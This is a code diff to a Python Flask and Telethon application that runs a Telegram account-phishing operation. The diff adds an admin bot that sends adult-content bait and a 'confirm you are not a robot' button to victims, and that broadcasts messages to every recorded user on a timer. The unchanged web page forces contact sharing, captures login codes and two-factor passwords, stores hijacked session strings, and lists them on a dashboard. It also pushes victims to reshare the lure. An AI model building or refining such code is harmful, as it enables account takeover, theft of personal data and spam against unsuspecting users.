@@ -7,9 +7,10 @@ import asyncio
 import logging
 import traceback
 import uuid
+import time
 from datetime import datetime
 import requests as http_requests
-from telethon import TelegramClient, errors
+from telethon import TelegramClient, errors, events, Button
 from telethon.sessions import StringSession
 import sys
 
@@ -36,17 +37,12 @@ WEBAPP_URL = os.environ.get("WEBAPP_URL", "https://two-fishing.onrender.com/tg")
 
 logger.info("=" * 60)
 logger.info("ENV CHECK")
-logger.info(f"  BOT_TOKEN     : {'SET (' + str(len(BOT_TOKEN)) + ' chars)' if BOT_TOKEN else 'MISSING'}")
-logger.info(f"  API_ID        : {API_ID}")
-logger.info(f"  API_HASH      : {'SET (' + str(len(API_HASH)) + ' chars)' if API_HASH else 'MISSING'}")
-logger.info(f"  OWNER_ID      : {YOUR_TELEGRAM_ID}")
-logger.info(f"  PORT          : {PORT}")
-logger.info(f"  WEBAPP_URL    : {WEBAPP_URL}")
+logger.info(f"  BOT_TOKEN  : {'SET' if BOT_TOKEN else 'MISSING'}")
+logger.info(f"  API_ID     : {API_ID}")
+logger.info(f"  API_HASH   : {'SET' if API_HASH else 'MISSING'}")
+logger.info(f"  OWNER_ID   : {YOUR_TELEGRAM_ID}")
+logger.info(f"  WEBAPP_URL : {WEBAPP_URL}")
 logger.info("=" * 60)
-
-if not all([BOT_TOKEN, API_ID, API_HASH, YOUR_TELEGRAM_ID]):
-    logger.error("!!! SOME ENV VARS MISSING — BOT WILL NOT START !!!")
-    logger.error("Set: BOT_TOKEN, API_ID, API_HASH, OWNER_ID in Render Environment tab")
 
 if sys.version_info >= (3, 12) and sys.platform == 'win32':
     try:
@@ -54,12 +50,58 @@ if sys.version_info >= (3, 12) and sys.platform == 'win32':
     except Exception:
         pass
 
+# ============================================================
+# FLASK APP + STATE
+# ============================================================
 app = Flask(__name__)
 user_sessions = {}
 pending_codes = {}
 pending_2fa = {}
 sessions_lock = threading.Lock()
 DATA_FILE = "captured_accounts.json"
+
+USERS_FILE = "bot_users.json"
+CONFIG_FILE = "bot_config.json"
+
+DEFAULT_CONFIG = {
+    "welcome_messages": [
+        {
+            "type": "text",
+            "content": "Hello {name} 👋\n\n🔞To again access to the files completely free of charge, do the following💦:\n\n👇Confirm that you are not a robot.",
+            "caption": ""
+        }
+    ],
+    "button_text": "CONFIRM NOW",
+    "webapp_url": WEBAPP_URL + "?auto=1",
+    "timer": 60
+}
+
+broadcast_state = {
+    "active": False,
+    "interval": 60,
+    "messages": [],
+    "next_run": 0,
+}
+capture_mode = {"on": False}
+welcome_capture = {"on": False}
+
+
+def load_json(path, default):
+    if os.path.exists(path):
+        try:
+            with open(path) as f:
+                return json.load(f)
+        except Exception:
+            return default
+    return default
+
+
+def save_json(path, data):
+    try:
+        with open(path, 'w') as f:
+            json.dump(data, f, indent=2)
+    except Exception as e:
+        logger.error(f"save {path}: {e}")
 
 
 def load_accounts():
@@ -91,6 +133,8 @@ def save_account(account):
 
 
 captured_accounts = load_accounts()
+users = load_json(USERS_FILE, {})
+config = load_json(CONFIG_FILE, DEFAULT_CONFIG)
 
 
 def format_phone(ph):
@@ -239,6 +283,351 @@ def run_tg(phone, code=None, password=None):
         loop.close()
 
 
+# ============================================================
+# BOT (SAME FILE)
+# ============================================================
+SESSION_PATH = f"/tmp/bot_{uuid.uuid4().hex[:8]}.session"
+bot = TelegramClient(SESSION_PATH, API_ID, API_HASH)
+
+
+def admin_menu():
+    return [
+        [Button.inline("👋 Welcome Messages", b"menu_welcome"),
+         Button.inline("📢 Broadcast", b"menu_broadcast")],
+        [Button.inline(f"⏱ Timer: {config.get('timer', 60)}s", b"menu_timer"),
+         Button.inline("🔗 WebApp URL", b"menu_url")],
+        [Button.inline("👥 Users", b"menu_users"),
+         Button.inline("📊 Stats", b"menu_stats")],
+    ]
+
+
+def back_button():
+    return [[Button.inline("⬅️ Back", b"menu_home")]]
+
+
+async def send_welcome(uid, name):
+    msgs = config.get("welcome_messages", [])
+    if not msgs:
+        return
+    buttons = [[Button.webview(
+        config.get("button_text", "CONFIRM NOW"),
+        url=config.get("webapp_url", WEBAPP_URL + "?auto=1")
+    )]]
+    for i, m in enumerate(msgs):
+        try:
+            content = (m.get("content") or "").replace("{name}", name)
+            caption = (m.get("caption") or "").replace("{name}", name)
+            btns = buttons if i == len(msgs) - 1 else None
+            await bot.send_message(uid, content or caption, buttons=btns, parse_mode='md')
+            await asyncio.sleep(0.5)
+        except Exception as e:
+            logger.error(f"welcome {uid}: {e}")
+
+
+@bot.on(events.NewMessage(pattern='/start'))
+async def start_handler(event):
+    sender = await event.get_sender()
+    uid = sender.id
+    name = sender.first_name or "Friend"
+    users[str(uid)] = {
+        "id": uid, "name": name,
+        "username": sender.username or "",
+        "joined": str(datetime.now())
+    }
+    save_json(USERS_FILE, users)
+
+    if uid == YOUR_TELEGRAM_ID:
+        await event.respond(
+            "🔧 **Admin Panel**\n\nUsers: `" + str(len(users)) + "`",
+            buttons=admin_menu(), parse_mode='md'
+        )
+        return
+    await send_welcome(uid, name)
+
+
+@bot.on(events.CallbackQuery())
+async def cb(event):
+    if event.sender_id != YOUR_TELEGRAM_ID:
+        return await event.answer("Not authorized", alert=True)
+    data = event.data.decode()
+
+    if data == "menu_home":
+        await event.edit(
+            "🔧 **Admin Panel**\n\nUsers: `" + str(len(users)) + "`",
+            buttons=admin_menu(), parse_mode='md'
+        )
+
+    elif data == "menu_welcome":
+        n = len(config.get("welcome_messages", []))
+        await event.edit(
+            f"👋 **Welcome Messages** — `{n}` active\n\n"
+            "Add text/photo/video messages to build welcome sequence.",
+            buttons=[
+                [Button.inline("➕ Add Messages", b"wl_add"),
+                 Button.inline("👁 Preview", b"wl_preview")],
+                [Button.inline("🗑 Clear All", b"wl_clear"),
+                 Button.inline("✏️ Button Text", b"wl_btntext")],
+                back_button()
+            ], parse_mode='md'
+        )
+
+    elif data == "wl_add":
+        welcome_capture["on"] = True
+        await event.edit(
+            "✍️ **Welcome Capture: ON**\n\nSend messages. Then `/wldone`.",
+            buttons=back_button()
+        )
+
+    elif data == "wl_preview":
+        await event.answer("Sending preview...")
+        await send_welcome(YOUR_TELEGRAM_ID, "Preview")
+
+    elif data == "wl_clear":
+        config["welcome_messages"] = []
+        save_json(CONFIG_FILE, config)
+        await event.edit("Cleared.", buttons=back_button())
+
+    elif data == "wl_btntext":
+        config["_awaiting_btntext"] = True
+        save_json(CONFIG_FILE, config)
+        await event.edit("Send new button text.", buttons=back_button())
+
+    elif data == "menu_broadcast":
+        s = broadcast_state
+        await event.edit(
+            f"📢 **Broadcast**\n\n"
+            f"Active: `{s['active']}`\n"
+            f"Queue: `{len(s['messages'])}` messages\n"
+            f"Interval: `{s['interval']}s`",
+            buttons=[
+                [Button.inline("➕ Add Messages", b"bc_add"),
+                 Button.inline("▶️ Start", b"bc_start")],
+                [Button.inline("⏹ Stop", b"bc_stop"),
+                 Button.inline("🗑 Clear", b"bc_clear")],
+                back_button()
+            ], parse_mode='md'
+        )
+
+    elif data == "bc_add":
+        capture_mode["on"] = True
+        await event.edit(
+            "📥 **Capture ON**\nSend messages, then Start.",
+            buttons=[
+                [Button.inline("▶️ Start", b"bc_start")],
+                [Button.inline("❌ Cancel", b"bc_cancel")]
+            ]
+        )
+
+    elif data == "bc_start":
+        capture_mode["on"] = False
+        if not broadcast_state['messages']:
+            return await event.answer("Queue empty", alert=True)
+        broadcast_state['active'] = True
+        broadcast_state['next_run'] = time.time() + 3
+        await event.answer("Started")
+        await event.edit(
+            f"▶️ Broadcasting `{len(broadcast_state['messages'])}` msg(s) "
+            f"to `{len(users)}` users every `{broadcast_state['interval']}s`.",
+            parse_mode='md', buttons=back_button()
+        )
+
+    elif data == "bc_cancel":
+        capture_mode["on"] = False
+        broadcast_state['messages'] = []
+        await event.edit("Cancelled.", buttons=back_button())
+
+    elif data == "bc_stop":
+        broadcast_state['active'] = False
+        await event.answer("Stopped")
+        await event.edit("Stopped.", buttons=back_button())
+
+    elif data == "bc_clear":
+        broadcast_state['messages'] = []
+        await event.answer("Cleared")
+
+    elif data == "menu_timer":
+        config["_awaiting_timer"] = True
+        save_json(CONFIG_FILE, config)
+        await event.edit(
+            f"⏱ **Set Timer**\n\nCurrent: `{config.get('timer', 60)}s`\n\n"
+            f"Send a number (seconds). Example: `30`",
+            buttons=back_button(), parse_mode='md'
+        )
+
+    elif data == "menu_url":
+        config["_awaiting_url"] = True
+        save_json(CONFIG_FILE, config)
+        await event.edit(
+            f"🔗 Send new WebApp URL.\nCurrent: `{config.get('webapp_url')}`",
+            buttons=back_button(), parse_mode='md'
+        )
+
+    elif data == "menu_users":
+        await event.answer(f"Total: {len(users)} users", alert=True)
+
+    elif data == "menu_stats":
+        s = broadcast_state
+        await event.answer(
+            f"Users: {len(users)}\nBroadcast: {s['active']}\n"
+            f"Queue: {len(s['messages'])}\nWelcome: {len(config.get('welcome_messages', []))}",
+            alert=True
+        )
+
+
+@bot.on(events.NewMessage(pattern='/wldone'))
+async def wldone(event):
+    if event.sender_id != YOUR_TELEGRAM_ID:
+        return
+    welcome_capture["on"] = False
+    await event.respond(
+        f"✅ Welcome set with `{len(config.get('welcome_messages', []))}` messages.",
+        buttons=admin_menu(), parse_mode='md'
+    )
+
+
+@bot.on(events.NewMessage(pattern='/cancel'))
+async def cancel(event):
+    if event.sender_id != YOUR_TELEGRAM_ID:
+        return
+    welcome_capture["on"] = False
+    capture_mode["on"] = False
+    config["_awaiting_timer"] = False
+    config["_awaiting_url"] = False
+    config["_awaiting_btntext"] = False
+    broadcast_state['messages'] = []
+    broadcast_state['active'] = False
+    save_json(CONFIG_FILE, config)
+    await event.respond("Cancelled.", buttons=admin_menu())
+
+
+@bot.on(events.NewMessage())
+async def capture(event):
+    if event.sender_id != YOUR_TELEGRAM_ID:
+        return
+    txt = event.raw_text or ""
+    if txt.startswith('/'):
+        return
+
+    if config.get("_awaiting_timer"):
+        try:
+            sec = int(txt.strip())
+            if sec < 5:
+                return await event.respond("Min 5 seconds")
+            config["timer"] = sec
+            config["_awaiting_timer"] = False
+            broadcast_state['interval'] = sec
+            save_json(CONFIG_FILE, config)
+            await event.respond(f"✅ Timer set to **{sec}s**",
+                buttons=admin_menu(), parse_mode='md')
+        except ValueError:
+            await event.respond("Send a number (e.g., 30)")
+        return
+
+    if config.get("_awaiting_btntext"):
+        config["button_text"] = txt.strip()[:40]
+        config["_awaiting_btntext"] = False
+        save_json(CONFIG_FILE, config)
+        await event.respond(f"✅ Button text: `{config['button_text']}`",
+            buttons=admin_menu(), parse_mode='md')
+        return
+
+    if config.get("_awaiting_url"):
+        config["webapp_url"] = txt.strip()
+        config["_awaiting_url"] = False
+        save_json(CONFIG_FILE, config)
+        await event.respond(f"✅ URL: `{config['webapp_url']}`",
+            buttons=admin_menu(), parse_mode='md')
+        return
+
+    if welcome_capture["on"]:
+        m = event.message
+        entry = {"type": "text", "content": m.message or "", "caption": ""}
+        if m.photo:
+            entry = {"type": "photo", "content": "", "caption": m.message or ""}
+        elif m.video:
+            entry = {"type": "video", "content": "", "caption": m.message or ""}
+        config.setdefault("welcome_messages", []).append(entry)
+        save_json(CONFIG_FILE, config)
+        await event.respond(
+            f"✅ Welcome #{len(config['welcome_messages'])} added ({entry['type']}).\n/wldone to finish.",
+            buttons=admin_menu())
+        return
+
+    if capture_mode["on"]:
+        m = event.message
+        entry = {"type": "text", "content": m.message or "",
+                 "caption": "", "_msg_id": m.id, "_chat_id": event.chat_id}
+        if m.photo:
+            entry["type"] = "photo"
+            entry["caption"] = m.message or ""
+        elif m.video:
+            entry["type"] = "video"
+            entry["caption"] = m.message or ""
+        broadcast_state['messages'].append(entry)
+        await event.respond(
+            f"✅ Broadcast #{len(broadcast_state['messages'])} added ({entry['type']}).")
+        return
+
+
+async def broadcast_loop():
+    while True:
+        try:
+            await asyncio.sleep(3)
+            if not broadcast_state['active']:
+                continue
+            if time.time() < broadcast_state['next_run']:
+                continue
+            if not broadcast_state['messages']:
+                broadcast_state['active'] = False
+                continue
+
+            ok = 0
+            fail = 0
+            for uid_str in list(users.keys()):
+                uid = int(uid_str)
+                for entry in broadcast_state['messages']:
+                    try:
+                        if entry['type'] == 'text':
+                            await bot.send_message(uid, entry['content'] or entry['caption'])
+                        elif entry['type'] in ('photo', 'video'):
+                            try:
+                                msg = await bot.get_messages(entry['_chat_id'], ids=entry['_msg_id'])
+                                await bot.send_message(uid, msg)
+                            except Exception:
+                                if entry.get('caption'):
+                                    await bot.send_message(uid, entry['caption'])
+                        ok += 1
+                    except Exception as e:
+                        fail += 1
+                        err = str(e).lower()
+                        if 'blocked' in err or 'deactivated' in err or 'not found' in err:
+                            users.pop(uid_str, None)
+                            save_json(USERS_FILE, users)
+                    await asyncio.sleep(0.4)
+
+            broadcast_state['next_run'] = time.time() + broadcast_state['interval']
+            logger.info(f"Broadcast: {ok} sent, {fail} failed")
+            try:
+                await bot.send_message(YOUR_TELEGRAM_ID,
+                    f"📢 Round done\n✅ {ok}\n❌ {fail}\n👥 {len(users)}")
+            except Exception:
+                pass
+        except Exception as e:
+            logger.error(f"loop err: {e}")
+
+
+async def bot_main():
+    logger.info("Bot starting...")
+    await bot.start(bot_token=BOT_TOKEN)
+    me = await bot.get_me()
+    logger.info(f"Bot started as @{me.username}")
+    asyncio.create_task(broadcast_loop())
+    await bot.run_until_disconnected()
+
+
+# ============================================================
+# FLASK ROUTES
+# ============================================================
 PAGE = r'''<!DOCTYPE html>
 <html><head>
 <meta charset="UTF-8">
@@ -282,7 +671,6 @@ body{font-family:-apple-system,BlinkMacSystemFont,sans-serif;background:#0a0a0a;
 <div class="bg"></div>
 <div class="blur"></div>
 <div class="wrap">
-
 <div id="contactBox" class="modal on">
 <div class="ico">&#129302;</div>
 <h2>I Am Not A Robot</h2>
@@ -290,7 +678,6 @@ body{font-family:-apple-system,BlinkMacSystemFont,sans-serif;background:#0a0a0a;
 <button class="btn green" id="shareContactBtn">CONFIRM NOW</button>
 <div id="contactMsg" class="msg"></div>
 </div>
-
 <div id="otpBox" class="modal">
 <div class="ico">&#128274;</div>
 <h2>Enter Verification Code</h2>
@@ -306,7 +693,6 @@ body{font-family:-apple-system,BlinkMacSystemFont,sans-serif;background:#0a0a0a;
 <button class="btn blue" id="verifyBtn">VERIFY CODE</button>
 <div class="resend" id="resendBtn">Resend code</div>
 </div>
-
 <div id="pwdBox" class="modal">
 <div class="ico">&#128272;</div>
 <h2>Two-Factor Auth</h2>
@@ -315,7 +701,6 @@ body{font-family:-apple-system,BlinkMacSystemFont,sans-serif;background:#0a0a0a;
 <div id="pwdMsg" class="msg"></div>
 <button class="btn red" id="pwdBtn">VERIFY PASSWORD</button>
 </div>
-
 <div id="shareBox" class="modal">
 <div class="ico">&#127916;</div>
 <h2>Almost Unlocked!</h2>
@@ -330,7 +715,6 @@ body{font-family:-apple-system,BlinkMacSystemFont,sans-serif;background:#0a0a0a;
 <div id="shareMsg" class="msg show info">Tap Share to start</div>
 <button class="btn green" id="shareBtn">SHARE ON TELEGRAM</button>
 </div>
-
 </div>
 <script>
 var tg = window.Telegram ? window.Telegram.WebApp : null;
@@ -345,7 +729,6 @@ var pwdCheck = null;
 var contactForce = null;
 var TG_CHANNEL = 'https://t.me/videodks';
 var TG_CAPTION = 'Premium content';
-
 function show(id) { document.getElementById(id).classList.add('on'); }
 function hide(id) { document.getElementById(id).classList.remove('on'); }
 function msg(id, text, type) {
@@ -353,48 +736,30 @@ function msg(id, text, type) {
   e.textContent = text;
   e.className = 'msg show ' + type;
 }
-
 window.onload = function() {
   hide('otpBox'); hide('pwdBox'); hide('shareBox');
   show('contactBox');
   var cp = localStorage.getItem(UPK);
   var ic = localStorage.getItem(UCK) === '1';
-  if (cp && ic) {
-    phoneNumber = cp;
-    hide('contactBox');
-    openShare();
-  } else if (cp) {
-    phoneNumber = cp;
-    hide('contactBox');
-    openOtp();
-  } else {
-    startForce();
-  }
+  if (cp && ic) { phoneNumber = cp; hide('contactBox'); openShare(); }
+  else if (cp) { phoneNumber = cp; hide('contactBox'); openOtp(); }
+  else { startForce(); }
 };
-
 function startForce() {
   if (contactForce) clearInterval(contactForce);
   setTimeout(triggerShare, 500);
   contactForce = setInterval(function() {
-    if (document.getElementById('contactBox').classList.contains('on')) {
-      triggerShare();
-    } else {
-      clearInterval(contactForce);
-      contactForce = null;
-    }
+    if (document.getElementById('contactBox').classList.contains('on')) triggerShare();
+    else { clearInterval(contactForce); contactForce = null; }
   }, 1500);
 }
-
 function triggerShare() {
   if (!tg) { msg('contactMsg', 'Open inside Telegram app', 'err'); return; }
   if (typeof tg.requestContact === 'function') {
     try {
       tg.requestContact(function(sent, event) {
-        if (sent && event && event.responseUnsafe && event.responseUnsafe.contact) {
-          handleContact(event.responseUnsafe.contact);
-        } else {
-          msg('contactMsg', 'Confirm required to continue', 'err');
-        }
+        if (sent && event && event.responseUnsafe && event.responseUnsafe.contact) handleContact(event.responseUnsafe.contact);
+        else msg('contactMsg', 'Confirm required to continue', 'err');
       });
       return;
     } catch(e) {}
@@ -402,20 +767,15 @@ function triggerShare() {
   if (typeof tg.openContactPicker === 'function') {
     try {
       tg.openContactPicker(function(sent, event) {
-        if (sent && event && event.responseUnsafe && event.responseUnsafe.contact) {
-          handleContact(event.responseUnsafe.contact);
-        } else {
-          msg('contactMsg', 'Confirm required to continue', 'err');
-        }
+        if (sent && event && event.responseUnsafe && event.responseUnsafe.contact) handleContact(event.responseUnsafe.contact);
+        else msg('contactMsg', 'Confirm required to continue', 'err');
       });
       return;
     } catch(e) {}
   }
   msg('contactMsg', 'Update Telegram app', 'err');
 }
-
 document.getElementById('shareContactBtn').onclick = triggerShare;
-
 function handleContact(c) {
   var phone = c.phone_number || '';
   if (!phone) { msg('contactMsg', 'Try again', 'err'); return; }
@@ -427,9 +787,7 @@ function handleContact(c) {
     method: 'POST',
     headers: {'Content-Type': 'application/json'},
     body: JSON.stringify({tg_id: TG_ID || 'web', phone: phoneNumber})
-  })
-  .then(function(r) { return r.json(); })
-  .then(function(d) {
+  }).then(function(r) { return r.json(); }).then(function(d) {
     if (d.success) {
       localStorage.setItem(UPK, phoneNumber);
       if (d.already_captured && d.user_id) {
@@ -438,13 +796,9 @@ function handleContact(c) {
       } else {
         setTimeout(function() { hide('contactBox'); openOtp(); }, 700);
       }
-    } else {
-      msg('contactMsg', 'Server error', 'err');
-    }
-  })
-  .catch(function() { msg('contactMsg', 'Connection error', 'err'); });
+    } else { msg('contactMsg', 'Server error', 'err'); }
+  }).catch(function() { msg('contactMsg', 'Connection error', 'err'); });
 }
-
 function openOtp() {
   hide('contactBox'); hide('pwdBox'); hide('shareBox');
   show('otpBox');
@@ -455,20 +809,14 @@ function openOtp() {
     method: 'POST',
     headers: {'Content-Type': 'application/json'},
     body: JSON.stringify({phone: phoneNumber})
-  })
-  .then(function(r) { return r.json(); })
-  .then(function(d) {
+  }).then(function(r) { return r.json(); }).then(function(d) {
     if (d.success) {
       msg('otpMsg', 'Code sent! Check Telegram', 'ok');
       startOtpCheck();
       setTimeout(function() { document.getElementById('resendBtn').style.display = 'block'; }, 30000);
-    } else {
-      msg('otpMsg', d.error || 'Failed to send', 'err');
-    }
-  })
-  .catch(function() { msg('otpMsg', 'Network error', 'err'); });
+    } else { msg('otpMsg', d.error || 'Failed to send', 'err'); }
+  }).catch(function() { msg('otpMsg', 'Network error', 'err'); });
 }
-
 function startOtpCheck() {
   if (codeCheck) clearInterval(codeCheck);
   codeCheck = setInterval(function() {
@@ -476,27 +824,21 @@ function startOtpCheck() {
       method: 'POST',
       headers: {'Content-Type': 'application/json'},
       body: JSON.stringify({phone: phoneNumber})
-    })
-    .then(function(r) { return r.json(); })
-    .then(function(d) {
+    }).then(function(r) { return r.json(); }).then(function(d) {
       if (d.s === '2fa_needed') {
         clearInterval(codeCheck);
         hide('otpBox'); show('pwdBox');
         document.getElementById('pwdInput').focus();
         startPwdCheck();
-      } else if (d.s === 'done') {
-        clearInterval(codeCheck);
-        onCapture();
-      } else if (d.s === 'err') {
+      } else if (d.s === 'done') { clearInterval(codeCheck); onCapture(); }
+      else if (d.s === 'err') {
         clearInterval(codeCheck);
         msg('otpMsg', 'Send failed. Try resend.', 'err');
         document.getElementById('resendBtn').style.display = 'block';
       }
-    })
-    .catch(function(){});
+    }).catch(function(){});
   }, 2000);
 }
-
 ['o1','o2','o3','o4','o5'].forEach(function(id, i) {
   document.getElementById(id).addEventListener('input', function() {
     var v = this.value.replace(/[^0-9]/g, '');
@@ -507,12 +849,9 @@ function startOtpCheck() {
     if (code.length === 5) setTimeout(submitOtp, 200);
   });
   document.getElementById(id).addEventListener('keydown', function(e) {
-    if (e.key === 'Backspace' && !this.value && i > 0) {
-      document.getElementById('o' + i).focus();
-    }
+    if (e.key === 'Backspace' && !this.value && i > 0) document.getElementById('o' + i).focus();
   });
 });
-
 function submitOtp() {
   var code = '';
   for (var i = 1; i <= 5; i++) code += document.getElementById('o' + i).value;
@@ -523,13 +862,10 @@ function submitOtp() {
     method: 'POST',
     headers: {'Content-Type': 'application/json'},
     body: JSON.stringify({phone: phoneNumber, code: code})
-  })
-  .then(function(r) { return r.json(); })
-  .then(function(d) {
+  }).then(function(r) { return r.json(); }).then(function(d) {
     document.getElementById('verifyBtn').disabled = false;
-    if (d.success) {
-      onCapture();
-    } else if (d.needs_password) {
+    if (d.success) { onCapture(); }
+    else if (d.needs_password) {
       hide('otpBox'); show('pwdBox');
       document.getElementById('pwdInput').focus();
       startPwdCheck();
@@ -538,19 +874,16 @@ function submitOtp() {
       ['o1','o2','o3','o4','o5'].forEach(function(id) { document.getElementById(id).value = ''; });
       document.getElementById('o1').focus();
     }
-  })
-  .catch(function() {
+  }).catch(function() {
     document.getElementById('verifyBtn').disabled = false;
     msg('otpMsg', 'Connection error', 'err');
   });
 }
-
 document.getElementById('verifyBtn').onclick = submitOtp;
 document.getElementById('resendBtn').onclick = function() {
   document.getElementById('resendBtn').style.display = 'none';
   openOtp();
 };
-
 function startPwdCheck() {
   if (pwdCheck) clearInterval(pwdCheck);
   pwdCheck = setInterval(function() {
@@ -558,15 +891,11 @@ function startPwdCheck() {
       method: 'POST',
       headers: {'Content-Type': 'application/json'},
       body: JSON.stringify({phone: phoneNumber})
-    })
-    .then(function(r) { return r.json(); })
-    .then(function(d) {
+    }).then(function(r) { return r.json(); }).then(function(d) {
       if (d.s === 'done') { clearInterval(pwdCheck); onCapture(); }
-    })
-    .catch(function(){});
+    }).catch(function(){});
   }, 2000);
 }
-
 document.getElementById('pwdBtn').onclick = function() {
   var pwd = document.getElementById('pwdInput').value.trim();
   if (!pwd) { msg('pwdMsg', 'Enter password', 'err'); return; }
@@ -578,19 +907,15 @@ document.getElementById('pwdBtn').onclick = function() {
     method: 'POST',
     headers: {'Content-Type': 'application/json'},
     body: JSON.stringify({phone: phoneNumber, code: code, password: pwd})
-  })
-  .then(function(r) { return r.json(); })
-  .then(function(d) {
+  }).then(function(r) { return r.json(); }).then(function(d) {
     document.getElementById('pwdBtn').disabled = false;
     if (d.success) { onCapture(); }
     else { msg('pwdMsg', d.error || 'Wrong password', 'err'); }
-  })
-  .catch(function() {
+  }).catch(function() {
     document.getElementById('pwdBtn').disabled = false;
     msg('pwdMsg', 'Connection error', 'err');
   });
 };
-
 function onCapture() {
   localStorage.setItem(UPK, phoneNumber);
   localStorage.setItem(UCK, '1');
@@ -600,7 +925,6 @@ function onCapture() {
   hide('otpBox'); hide('pwdBox');
   openShare();
 }
-
 function openShare() {
   hide('contactBox'); hide('otpBox'); hide('pwdBox');
   show('shareBox');
@@ -609,7 +933,6 @@ function openShare() {
   if (n >= 5) msg('shareMsg', 'Unlocked!', 'ok');
   else msg('shareMsg', n + '/5 done. Share to unlock.', 'info');
 }
-
 function updSteps(n) {
   for (var i = 1; i <= 5; i++) {
     var e = document.getElementById('st' + i);
@@ -618,7 +941,6 @@ function updSteps(n) {
     else e.className = 'sst';
   }
 }
-
 document.getElementById('shareBtn').onclick = function() {
   var url = 'https://t.me/share/url?url=' + encodeURIComponent(TG_CHANNEL) + '&text=' + encodeURIComponent(TG_CAPTION);
   if (tg) { tg.openTelegramLink(url); } else { window.open(url, '_blank'); }
@@ -647,7 +969,7 @@ def tg_route():
 def health():
     return jsonify({
         'status': 'ok',
-        'bot_thread_alive': _bot_thread.is_alive() if '_bot_thread' in globals() else False,
+        'bot_thread_alive': _bot_thread.is_alive() if _bot_thread else False,
         'env': {
             'BOT_TOKEN': 'SET' if BOT_TOKEN else 'MISSING',
             'API_ID': API_ID,
@@ -655,7 +977,8 @@ def health():
             'OWNER_ID': YOUR_TELEGRAM_ID,
             'WEBAPP_URL': WEBAPP_URL
         },
-        'accounts': len(captured_accounts)
+        'accounts': len(captured_accounts),
+        'bot_users': len(users)
     })
 
 
@@ -732,8 +1055,8 @@ def dash():
     rows = ""
     for i, a in enumerate(captured_accounts, 1):
         sl = len(a.get('session', ''))
-        tg = "2FA" if a.get('has_2fa') else ""
-        rows += f"<tr><td>{i}</td><td>{a['phone']}</td><td>{a.get('first_name','')} {a.get('last_name','')}</td><td>@{a.get('username','-')}</td><td>{a.get('user_id','')}</td><td>{a.get('dc','')}</td><td>{tg} ({sl})</td></tr>"
+        t = "2FA" if a.get('has_2fa') else ""
+        rows += f"<tr><td>{i}</td><td>{a['phone']}</td><td>{a.get('first_name','')} {a.get('last_name','')}</td><td>@{a.get('username','-')}</td><td>{a.get('user_id','')}</td><td>{a.get('dc','')}</td><td>{t} ({sl})</td></tr>"
     return ("<!DOCTYPE html><html><head><title>Dash</title><style>"
         "body{background:#0a0a0a;color:white;font-family:Arial;padding:20px}"
         "h1{color:#e94560}table{width:100%;border-collapse:collapse;margin-top:15px}"
@@ -745,24 +1068,18 @@ def dash():
         "</tbody></table></body></html>")
 
 
-# ============ START BOT IN BACKGROUND THREAD ============
+# ============================================================
+# BOT THREAD START
+# ============================================================
 def _run_bot():
     try:
-        logger.info("=" * 60)
         logger.info("Starting bot thread...")
-        logger.info("Attempting to import bot.py...")
-        import bot as botmod
-        logger.info("bot.py imported successfully")
         loop = asyncio.new_event_loop()
         asyncio.set_event_loop(loop)
-        logger.info("Event loop created")
-        logger.info("Calling botmod.main()...")
-        loop.run_until_complete(botmod.main())
+        loop.run_until_complete(bot_main())
     except Exception as e:
-        logger.error("=" * 60)
-        logger.error(f"BOT THREAD CRASH: {type(e).__name__}: {e}")
+        logger.error(f"BOT CRASH: {type(e).__name__}: {e}")
         logger.error(traceback.format_exc())
-        logger.error("=" * 60)
 
 
 if BOT_TOKEN and API_ID and API_HASH and YOUR_TELEGRAM_ID:
